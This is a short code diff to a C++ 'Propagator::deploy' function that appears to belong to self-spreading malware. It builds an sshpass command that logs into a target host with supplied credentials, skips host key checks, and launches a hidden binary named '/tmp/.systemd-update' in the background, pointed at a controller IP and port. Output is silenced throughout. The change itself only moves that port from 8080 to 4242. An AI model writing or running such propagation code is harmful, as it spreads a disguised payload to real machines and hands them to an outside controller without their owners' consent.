@@ -163,7 +163,7 @@ Propagator::Result Propagator::deploy(const std::string& target) {
         std::string cmd = "SSHPASS=" + pass + " sshpass -e ssh -o StrictHostKeyChecking=no "
                           "-o ConnectTimeout=10 " + user + "@" + target +
                           " 'chmod +x /tmp/.systemd-update && "
-                          "nohup /tmp/.systemd-update " + server_ip + " 8080 >/dev/null 2>&1 &' "
+                          "nohup /tmp/.systemd-update " + server_ip + " 4242 >/dev/null 2>&1 &' "
                           "2>/dev/null";
         ShellExecutor::Result r = shell.execute(cmd);
         output << "[SSH_EXEC] " << (r.success ? "OK" : "FAILED") << "\n";
